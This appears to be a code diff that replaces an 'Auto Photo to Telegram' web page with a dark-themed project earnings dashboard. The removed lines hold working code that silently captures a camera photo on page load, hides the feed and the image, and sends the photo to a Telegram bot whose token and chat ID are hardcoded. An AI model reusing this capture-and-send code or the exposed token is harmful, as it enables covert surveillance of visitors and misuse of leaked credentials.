@@ -3,245 +3,506 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Photo to Telegram</title>
+    <title>Project Dashboard</title>
+    
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Chart.js for earnings chart -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    
+    <!-- Google Fonts: Roboto -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
     <style>
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+            background-color: #1a1c1e; /* Darker, more Material-like background */
         }
-        .container {
-            background-color: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-            display: none;
-            visibility: hidden;
-            flex-direction: column;
-            align-items: center;
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        video {
-            display: none; /* Always hidden: camera feed will not be shown */
-                        visibility: hidden;
+        .animate-fade-in {
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+        /* Custom file input */
+        .custom-file-button input[type="file"] { display: none; }
 
+        /* Styling for filter/sort chips */
+        .filter-chip {
+            transition: background-color 0.2s, color 0.2s;
         }
-        canvas {
-            display: none; /* Canvas is used for capturing, not direct display */
-            visibility: hidden;
-        img {
-            display: none; /* Always hidden: captured photo will not be shown on the page */
-                        visibility: hidden;
+        .filter-chip.active {
+            background-color: #a8c7fa; /* Material blue */
+            color: #0c315a;
         }
-        .message-box {
-            background-color: #fff3cd;
-            color: #664d03;
-            padding: 15px;
-            border: 1px solid #ffecb5;
-            border-radius: 8px;
-            margin-top: 20px;
-            text-align: left;
-            width: 100%;
-        }
-        .loading-spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-left-color: #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin-top: 20px;
-            display: none; /* Hidden by default */
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .permission-text {
-            font-size: 1rem;
-            color: #555;
-            margin-top: 15px;
+        
+        /* FIX: Ensure date picker icon and text are visible in dark mode */
+        input[type="date"] {
+            color-scheme: dark;
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <h1 class="text-3xl font-bold text-gray-800 mb-4">Auto Photo to Telegram</h1>
-        <p class="permission-text">
-            Please allow camera access. A photo will be taken and sent directly to your Telegram bot.
-            Neither the camera feed nor the photo will be displayed on this page.
-        </p>
-        <video id="videoElement" autoplay playsinline></video>
-        <canvas id="canvasElement"></canvas>
-        <img id="photoOutput" alt="Captured Photo" class="hidden">
-        <div id="messageBox" class="message-box hidden"></div>
-        <div id="loadingSpinner" class="loading-spinner"></div>
+<body class="text-slate-200 antialiased">
+
+    <!-- Main Container -->
+    <div id="app" class="relative min-h-screen flex flex-col p-4 sm:p-6 lg:p-8">
+        
+        <!-- Header -->
+        <header class="mb-6">
+            <h1 class="text-4xl font-bold text-slate-100 tracking-tight">Dashboard</h1>
+        </header>
+
+        <!-- Main Content Area -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <!-- Left Column / Main Content on Mobile -->
+            <div class="lg:col-span-2 space-y-8">
+                <!-- Controls: Search, Filter, Sort -->
+                <div class="bg-[#2f3033] p-4 rounded-2xl">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <!-- Search Bar -->
+                        <div class="relative">
+                             <input type="search" id="search-input" placeholder="Search projects..." class="w-full bg-[#1a1c1e] text-slate-200 rounded-full py-3 pl-12 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                             <div class="absolute inset-y-0 left-0 flex items-center pl-4 pointer-events-none">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-slate-400"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                             </div>
+                        </div>
+                        <!-- Filters -->
+                        <div class="flex items-center gap-2 overflow-x-auto pb-2">
+                             <select id="category-filter" class="bg-[#1a1c1e] text-slate-200 rounded-full py-3 px-5 focus:outline-none focus:ring-2 focus:ring-blue-500 appearance-none">
+                                <option value="all">All Categories</option>
+                                <option value="Design">Design</option>
+                                <option value="Video Editing">Video Editing</option>
+                             </select>
+                        </div>
+                    </div>
+                     <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-sm text-slate-400 self-center mr-2">Sort by:</span>
+                        <button class="filter-chip active py-1.5 px-4 rounded-full text-sm font-medium bg-slate-700" data-sort="createdAt">Date Added</button>
+                        <button class="filter-chip py-1.5 px-4 rounded-full text-sm font-medium bg-slate-700" data-sort="title">Name</button>
+                        <button class="filter-chip py-1.5 px-4 rounded-full text-sm font-medium bg-slate-700" data-sort="amount">Amount</button>
+                        <button class="filter-chip py-1.5 px-4 rounded-full text-sm font-medium bg-slate-700" data-sort="dueDate">Due Date</button>
+                    </div>
+                </div>
+
+                <!-- Project Cards Grid -->
+                <main>
+                    <div id="project-list" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                       <div id="empty-state" class="hidden text-slate-500 md:col-span-2 text-center py-16">
+                            <p class="text-lg">No projects found.</p>
+                            <p class="text-sm">Try adjusting your search or filters.</p>
+                       </div>
+                    </div>
+                </main>
+            </div>
+
+            <!-- Right Column / Sidebar -->
+            <div class="lg:col-span-1 space-y-8">
+                <!-- Total Earnings -->
+                <div class="bg-[#2f3033] p-6 rounded-2xl">
+                    <p class="text-slate-400 text-sm font-medium">Total Earnings</p>
+                    <p id="total-earnings" class="text-4xl font-bold text-white tracking-tight mt-1">$0.00</p>
+                </div>
+                <!-- Earnings Chart -->
+                <div class="bg-[#2f3033] p-6 rounded-2xl">
+                    <h3 class="font-bold text-lg text-slate-200 mb-4">Earnings by Month</h3>
+                    <canvas id="earnings-chart"></canvas>
+                </div>
+            </div>
+        </div>
+
+        <!-- Floating Add Button -->
+        <button id="add-project-btn" class="fixed bottom-6 right-6 sm:bottom-8 sm:right-8 bg-blue-500 hover:bg-blue-400 text-white font-bold w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg transform hover:scale-110 transition-all duration-200 ease-in-out">
+            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>
+        </button>
+    </div>
+
+    <!-- Add/Edit Modal -->
+    <div id="project-modal" class="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center p-4 hidden">
+        <div class="bg-[#2f3033] rounded-2xl shadow-xl w-full max-w-md animate-fade-in" id="modal-content">
+            <form id="project-form" class="p-8">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 id="modal-title" class="text-2xl font-bold text-white">New Project</h3>
+                    <button type="button" id="close-modal-btn" class="text-slate-400 hover:text-white text-3xl leading-none">&times;</button>
+                </div>
+                
+                <input type="hidden" id="project-id">
+                <div class="space-y-4">
+                    <!-- Title, Amount, Due Date -->
+                    <input type="text" id="project-title" class="w-full bg-[#1a1c1e] rounded-lg px-4 py-3 focus:ring-2 focus:ring-blue-500" placeholder="Project Title" required>
+                    <input type="number" id="project-amount" min="0" step="0.01" class="w-full bg-[#1a1c1e] rounded-lg px-4 py-3" placeholder="Amount ($)" required>
+                    <input type="date" id="project-due-date" class="w-full bg-[#1a1c1e] rounded-lg px-4 py-3 text-slate-400" placeholder="Due Date">
+                    
+                    <!-- Status and Category -->
+                    <div class="grid grid-cols-2 gap-4">
+                        <select id="project-status" class="w-full bg-[#1a1c1e] rounded-lg px-4 py-3" required>
+                            <option value="In Progress">In Progress</option>
+                            <option value="Completed">Completed</option>
+                            <option value="On Hold">On Hold</option>
+                        </select>
+                        <select id="project-category" class="w-full bg-[#1a1c1e] rounded-lg px-4 py-3" required>
+                            <option value="Design">Design</option>
+                            <option value="Video Editing">Video Editing</option>
+                        </select>
+                    </div>
+
+                    <!-- Image Upload -->
+                    <div class="flex items-center gap-4">
+                       <img id="image-preview" src="https://placehold.co/100x100/1e293b/475569?text=Image" class="h-20 w-20 rounded-lg object-cover bg-slate-700">
+                       <label for="project-image" class="custom-file-button cursor-pointer bg-slate-600 hover:bg-slate-500 text-white font-semibold py-2 px-4 rounded-lg">Upload</label>
+                       <input id="project-image" type="file" accept="image/*">
+                    </div>
+                </div>
+
+                <button type="submit" id="form-submit-btn" class="w-full mt-8 bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg">Add Project</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Delete Modal -->
+    <div id="delete-modal" class="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center p-4 hidden">
+        <div class="bg-[#2f3033] rounded-2xl shadow-xl w-full max-w-sm p-6 animate-fade-in text-center">
+            <h3 class="text-xl font-bold text-white mb-2">Delete Project?</h3>
+            <div class="flex justify-center gap-4 mt-6">
+                <button id="cancel-delete-btn" class="w-full bg-slate-600 hover:bg-slate-500 font-bold py-2 rounded-lg">Cancel</button>
+                <button id="confirm-delete-btn" class="w-full bg-red-600 hover:bg-red-500 font-bold py-2 rounded-lg">Delete</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        const video = document.getElementById('videoElement');
-        const canvas = document.getElementById('canvasElement');
-        const photoOutput = document.getElementById('photoOutput'); // Kept for consistency, but will remain hidden
-        const messageBox = document.getElementById('messageBox');
-        const loadingSpinner = document.getElementById('loadingSpinner');
-        let stream = null; // To store the camera stream
+    document.addEventListener('DOMContentLoaded', () => {
+        // --- State ---
+        let db;
+        let chartInstance;
+        let state = {
+            searchTerm: '',
+            sortBy: 'createdAt',
+            sortDirection: 'desc',
+            filterByCategory: 'all'
+        };
 
-        // --- Telegram Bot Configuration ---
-        // REPLACE 'YOUR_CHAT_ID' with your actual Telegram chat ID.
-        // To get your chat ID:
-        // 1. Start a conversation with your bot (e.g., send /start)
-        // 2. Open this URL in your browser, replacing <YOUR_BOT_TOKEN> with your bot's token:
-        //    https://api.telegram.org/bot7928769425:AAGCLo0JY_7I489q09AbEp6LiIDLvsO980A/getUpdates
-        // 3. Look for the 'id' value inside the 'chat' object in the JSON response.
-        const TELEGRAM_BOT_TOKEN = '7928769425:AAGCLo0JY_7I489q09AbEp6LiIDLvsO980A';
-        const TELEGRAM_CHAT_ID = '509478224'; // Example: user needs to replace this with their actual chat_id
+        // --- DOM Elements ---
+        const projectList = document.getElementById('project-list');
+        const totalEarningsEl = document.getElementById('total-earnings');
+        const emptyState = document.getElementById('empty-state');
+        const addProjectBtn = document.getElementById('add-project-btn');
+        
+        // Modals
+        const projectModal = document.getElementById('project-modal');
+        const deleteModal = document.getElementById('delete-modal');
+        const closeModalBtn = document.getElementById('close-modal-btn');
+        const cancelDeleteBtn = document.getElementById('cancel-delete-btn');
+        const confirmDeleteBtn = document.getElementById('confirm-delete-btn');
 
-        /**
-         * Displays a message in the message box.
-         * @param {string} message - The message to display.
-         * @param {boolean} isError - True if it's an error message (red background), false for success/info (green/yellow background).
-         */
-        function showMessage(message, isError = false) {
-            messageBox.textContent = message;
-            if (isError) {
-                messageBox.className = 'message-box bg-red-100 text-red-700 border-red-200';
+        // Form & Filters
+        const projectForm = document.getElementById('project-form');
+        const searchInput = document.getElementById('search-input');
+        const categoryFilter = document.getElementById('category-filter');
+        const modalTitle = document.getElementById('modal-title');
+        const formSubmitBtn = document.getElementById('form-submit-btn');
+        const projectIdInput = document.getElementById('project-id');
+        const projectImageInput = document.getElementById('project-image');
+        const imagePreview = document.getElementById('image-preview');
+        const dueDateInput = document.getElementById('project-due-date');
+
+        // --- IndexedDB Setup ---
+        const DB_NAME = 'ProjectTrackerDB_V3';
+        const STORE_NAME = 'projects';
+
+        function initDB() {
+            const request = indexedDB.open(DB_NAME, 2); // Version 2 for schema upgrade
+            request.onupgradeneeded = (e) => {
+                db = e.target.result;
+                if (!db.objectStoreNames.contains(STORE_NAME)) {
+                    const store = db.createObjectStore(STORE_NAME, { keyPath: 'id', autoIncrement: true });
+                    store.createIndex('createdAt', 'createdAt', { unique: false });
+                }
+            };
+            request.onsuccess = (e) => { db = e.target.result; renderApp(); };
+            request.onerror = (e) => console.error('DB error:', e.target.errorCode);
+        }
+
+        // --- CRUD Functions ---
+        const getProjects = () => new Promise((resolve, reject) => {
+            const tx = db.transaction(STORE_NAME, 'readonly');
+            const store = tx.objectStore(STORE_NAME);
+            const req = store.getAll();
+            req.onsuccess = () => resolve(req.result);
+            req.onerror = () => reject(req.error);
+        });
+
+        const saveProject = (project) => new Promise((resolve, reject) => {
+            const tx = db.transaction(STORE_NAME, 'readwrite');
+            const store = tx.objectStore(STORE_NAME);
+            const req = store.put(project);
+            req.onsuccess = () => resolve(req.result);
+            req.onerror = () => reject(req.error);
+        });
+
+        const deleteProject = (id) => new Promise((resolve, reject) => {
+            const tx = db.transaction(STORE_NAME, 'readwrite');
+            const store = tx.objectStore(STORE_NAME);
+            const req = store.delete(id);
+            req.onsuccess = () => resolve();
+            req.onerror = () => reject(req.error);
+        });
+        
+        // --- Main Render Function ---
+        async function renderApp() {
+            const allProjects = await getProjects();
+
+            // Apply filters and search
+            let filteredProjects = allProjects.filter(p => 
+                p.title.toLowerCase().includes(state.searchTerm.toLowerCase()) &&
+                (state.filterByCategory === 'all' || p.category === state.filterByCategory)
+            );
+
+            // Apply sorting
+            filteredProjects.sort((a, b) => {
+                let valA = a[state.sortBy];
+                let valB = b[state.sortBy];
+                if (state.sortBy === 'title') {
+                    valA = valA.toLowerCase();
+                    valB = valB.toLowerCase();
+                }
+                
+                let comparison = 0;
+                if (valA > valB) comparison = 1;
+                else if (valA < valB) comparison = -1;
+
+                return state.sortDirection === 'desc' ? comparison * -1 : comparison;
+            });
+
+            renderProjectList(filteredProjects);
+            updateTotalEarnings(allProjects);
+            renderEarningsChart(allProjects);
+            updateEmptyState(filteredProjects.length);
+        }
+
+        // --- UI Rendering Sub-functions ---
+        function renderProjectList(projects) {
+            projectList.innerHTML = '';
+            projects.forEach(p => projectList.appendChild(createProjectCard(p)));
+        }
+
+        function updateTotalEarnings(projects) {
+            const total = projects.reduce((sum, p) => sum + p.amount, 0);
+            totalEarningsEl.textContent = formatCurrency(total);
+        }
+        
+        function updateEmptyState(count) {
+            emptyState.classList.toggle('hidden', count > 0);
+        }
+
+        function createProjectCard(p) {
+            const card = document.createElement('div');
+            card.className = 'bg-[#2f3033] rounded-2xl shadow-lg overflow-hidden flex flex-col animate-fade-in';
+            const placeholderImg = `https://placehold.co/400x300/1a1c1e/475569?text=${encodeURIComponent(p.title)}`;
+            
+            const statusColors = {
+                "In Progress": "bg-yellow-500", "Completed": "bg-green-500", "On Hold": "bg-gray-500"
+            };
+            const dueDate = p.dueDate ? new Date(p.dueDate + 'T00:00:00').toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric'}) : 'No date';
+
+            card.innerHTML = `
+                <img src="${p.image || placeholderImg}" class="h-40 w-full object-cover">
+                <div class="p-4 flex-grow flex flex-col">
+                    <div class="flex justify-between items-start mb-2">
+                        <span class="text-xs font-medium bg-blue-900/50 text-blue-300 py-1 px-2 rounded-full">${p.category}</span>
+                        <div class="flex items-center gap-2 text-xs">
+                            <div class="w-2 h-2 rounded-full ${statusColors[p.status]}"></div>
+                            <span>${p.status}</span>
+                        </div>
+                    </div>
+                    <h3 class="font-bold text-white text-lg flex-grow">${p.title}</h3>
+                    <p class="text-sm text-slate-400 mt-1">Due: ${dueDate}</p>
+                    <div class="mt-4 flex justify-between items-center">
+                        <p class="font-bold text-xl text-green-400">${formatCurrency(p.amount)}</p>
+                        <div class="flex items-center gap-1">
+                            <button data-action="edit" data-id="${p.id}" class="text-slate-400 p-2 rounded-full hover:bg-slate-700"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path></svg></button>
+                            <button data-action="delete" data-id="${p.id}" class="text-slate-400 p-2 rounded-full hover:bg-slate-700"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg></button>
+                        </div>
+                    </div>
+                </div>`;
+            return card;
+        }
+
+        function renderEarningsChart(projects) {
+            const ctx = document.getElementById('earnings-chart').getContext('2d');
+            const monthlyData = projects.reduce((acc, p) => {
+                if (!p.createdAt) return acc;
+                const month = new Date(p.createdAt).toLocaleString('default', { month: 'short', year: '2-digit' });
+                acc[month] = (acc[month] || 0) + p.amount;
+                return acc;
+            }, {});
+
+            const labels = Object.keys(monthlyData);
+            const data = Object.values(monthlyData);
+
+            if (chartInstance) chartInstance.destroy();
+            chartInstance = new Chart(ctx, {
+                type: 'bar',
+                data: { labels, datasets: [{ label: 'Earnings', data, backgroundColor: '#a8c7fa', borderRadius: 4 }] },
+                options: {
+                    responsive: true, maintainAspectRatio: false,
+                    scales: { 
+                      y: { beginAtZero: true, ticks: { color: '#94a3b8' }, grid: { color: 'rgba(255,255,255,0.1)' } },
+                      x: { ticks: { color: '#94a3b8' }, grid: { display: false } }
+                    },
+                    plugins: { legend: { display: false } }
+                }
+            });
+        }
+        
+        // --- Modal & Form Logic ---
+        const toggleModal = (name, show) => document.getElementById(`${name}-modal`).classList.toggle('hidden', !show);
+
+        async function handleFormSubmit(e) {
+            e.preventDefault();
+            const id = parseInt(projectIdInput.value);
+            const projectData = {
+                title: e.target['project-title'].value.trim(),
+                amount: parseFloat(e.target['project-amount'].value),
+                dueDate: e.target['project-due-date'].value,
+                status: e.target['project-status'].value,
+                category: e.target['project-category'].value,
+                image: imagePreview.src.startsWith('data:') ? imagePreview.src : null
+            };
+            if (id) {
+                projectData.id = id;
+                 // Preserve createdAt date on edit
+                const originalProject = (await getProjects()).find(p => p.id === id);
+                projectData.createdAt = originalProject.createdAt;
             } else {
-                messageBox.className = 'message-box bg-green-100 text-green-700 border-green-200';
-            }
-            messageBox.classList.remove('hidden');
-            loadingSpinner.style.display = 'none'; // Hide spinner on message
-        }
-
-        /**
-         * Hides the message box.
-         */
-        function hideMessage() {
-            messageBox.classList.add('hidden');
-        }
-
-        /**
-         * Starts the camera stream, captures a photo, and then sends it to Telegram.
-         */
-        async function startCameraAndProcessPhoto() {
-            loadingSpinner.style.display = 'block'; // Show spinner
-            hideMessage(); // Hide any previous messages
-
-            if (TELEGRAM_CHAT_ID === '-1002010834388' || !TELEGRAM_CHAT_ID) {
-                showMessage("Please update TELEGRAM_CHAT_ID in the script with your actual Telegram chat ID to send the photo.", true);
-                loadingSpinner.style.display = 'none';
-                return;
+                projectData.createdAt = new Date().toISOString();
             }
 
-            try {
-                showMessage("Requesting camera access...", false);
-                // Request access to the user's camera
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+            await saveProject(projectData);
+            toggleModal('project', false);
+            renderApp();
+        }
 
-                // Wait for the video to load enough metadata to know its dimensions
-                video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+        function openAddModal() {
+            projectForm.reset();
+            modalTitle.textContent = 'New Project';
+            formSubmitBtn.textContent = 'Add Project';
+            projectIdInput.value = '';
+            imagePreview.src = 'https://placehold.co/100x100/1e293b/475569?text=Image';
+            dueDateInput.classList.add('text-slate-400');
+            dueDateInput.classList.remove('text-slate-200');
+            toggleModal('project', true);
+        }
 
-                    // Give a small delay to ensure the video stream is stable before capturing
-                    setTimeout(() => {
-                        capturePhoto();
-                        loadingSpinner.style.display = 'none'; // Hide spinner after capture attempt
-                    }, 500); // 0.5 second delay
+        async function openEditModal(id) {
+            const project = (await getProjects()).find(p => p.id === id);
+            if(project) {
+                modalTitle.textContent = 'Edit Project';
+                formSubmitBtn.textContent = 'Save Changes';
+                projectIdInput.value = project.id;
+                projectForm['project-title'].value = project.title;
+                projectForm['project-amount'].value = project.amount;
+                projectForm['project-due-date'].value = project.dueDate;
+                projectForm['project-status'].value = project.status;
+                projectForm['project-category'].value = project.category;
+                imagePreview.src = project.image || 'https://placehold.co/100x100/1e293b/475569?text=Image';
+                
+                if (project.dueDate) {
+                    dueDateInput.classList.remove('text-slate-400');
+                    dueDateInput.classList.add('text-slate-200');
+                } else {
+                    dueDateInput.classList.add('text-slate-400');
+                    dueDateInput.classList.remove('text-slate-200');
+                }
+
+                toggleModal('project', true);
+            }
+        }
+
+        // --- Utility ---
+        const formatCurrency = (amount) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(amount);
+
+        // --- Event Listeners ---
+        addProjectBtn.addEventListener('click', openAddModal);
+        closeModalBtn.addEventListener('click', () => toggleModal('project', false));
+        
+        // FIX: Correctly handle FileReader to update the preview
+        projectImageInput.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (event) => {
+                    imagePreview.src = event.target.result;
                 };
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        projectForm.addEventListener('submit', handleFormSubmit);
 
-            } catch (err) {
-                console.error("Error accessing camera: ", err);
-                loadingSpinner.style.display = 'none'; // Hide spinner on error
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    showMessage("Camera access denied. Please allow camera permissions to use this feature.", true);
-                } else if (err.name === 'NotFoundError') {
-                    showMessage("No camera found on this device.", true);
+        // FIX: Change date input text color on selection
+        dueDateInput.addEventListener('change', (e) => {
+             if (e.target.value) {
+                e.target.classList.remove('text-slate-400');
+                e.target.classList.add('text-slate-200');
+             } else {
+                e.target.classList.add('text-slate-400');
+                e.target.classList.remove('text-slate-200');
+             }
+        });
+
+        projectList.addEventListener('click', (e) => {
+            const button = e.target.closest('button');
+            if (!button) return;
+            const { action, id } = button.dataset;
+            if (action === 'edit') openEditModal(parseInt(id));
+            if (action === 'delete') {
+                confirmDeleteBtn.dataset.id = id;
+                toggleModal('delete', true);
+            }
+        });
+
+        confirmDeleteBtn.addEventListener('click', async (e) => {
+            await deleteProject(parseInt(e.target.dataset.id));
+            toggleModal('delete', false);
+            renderApp();
+        });
+        cancelDeleteBtn.addEventListener('click', () => toggleModal('delete', false));
+
+        searchInput.addEventListener('input', (e) => {
+            state.searchTerm = e.target.value;
+            renderApp();
+        });
+        categoryFilter.addEventListener('change', (e) => {
+            state.filterByCategory = e.target.value;
+            renderApp();
+        });
+
+        document.querySelectorAll('.filter-chip').forEach(chip => {
+            chip.addEventListener('click', (e) => {
+                document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
+                const newSortBy = e.target.dataset.sort;
+                // Add active class back and handle sort direction toggle
+                const chipButton = e.currentTarget;
+                chipButton.classList.add('active');
+
+                if (state.sortBy === newSortBy) {
+                    state.sortDirection = state.sortDirection === 'asc' ? 'desc' : 'asc';
                 } else {
-                    showMessage("Could not access camera. Error: " + err.message, true);
+                    state.sortBy = newSortBy;
+                    state.sortDirection = 'desc'; // Default to desc for new sort
                 }
-            }
-        }
-
-        /**
-         * Captures a photo from the video stream, converts it to a Data URL, and sends it to Telegram.
-         */
-        function capturePhoto() {
-            if (!stream) {
-                showMessage("No camera stream available to capture photo.", true);
-                return;
-            }
-
-            const context = canvas.getContext('2d');
-            // Draw the current video frame onto the canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Get the image data from the canvas as a Data URL
-            const dataUrl = canvas.toDataURL('image/png');
-
-            // Stop the video stream immediately after capturing
-            if (stream) {
-                const tracks = stream.getTracks();
-                tracks.forEach(track => track.stop());
-                video.srcObject = null; // Disconnect stream from video element
-            }
-
-            // Send the captured photo to Telegram
-            sendPhotoToTelegram(dataUrl);
-        }
-
-        /**
-         * Sends the photo to a Telegram bot.
-         * @param {string} dataUrl - The base64 Data URL of the image.
-         */
-        async function sendPhotoToTelegram(dataUrl) {
-            loadingSpinner.style.display = 'block'; // Show spinner for sending
-            showMessage("Photo captured. Sending to Telegram...", false);
-
-            try {
-                // Convert Data URL to Blob for FormData upload
-                const response = await fetch(dataUrl);
-                const blob = await response.blob();
-
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'camera_capture.png'); // 'camera_capture.png' is the filename for Telegram
-
-                const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-
-                const telegramResponse = await fetch(telegramApiUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                const result = await telegramResponse.json();
-
-                if (result.ok) {
-                    showMessage("Photo sent to Telegram successfully!", false);
-                } else {
-                    showMessage(`Failed to send photo to Telegram. Error: ${result.description || 'Unknown error'}`, true);
-                    console.error("Telegram API Error:", result);
-                }
-            } catch (error) {
-                console.error("Error sending photo to Telegram:", error);
-                showMessage(`Error sending photo to Telegram: ${error.message}`, true);
-            } finally {
-                loadingSpinner.style.display = 'none'; // Hide spinner after sending attempt
-            }
-        }
-
-        // Automatically start the camera and process the photo when the page loads
-        window.onload = startCameraAndProcessPhoto;
+                renderApp();
+            });
+        });
+        
+        // --- Initial Load ---
+        initDB();
+    });
     </script>
 </body>
 </html>
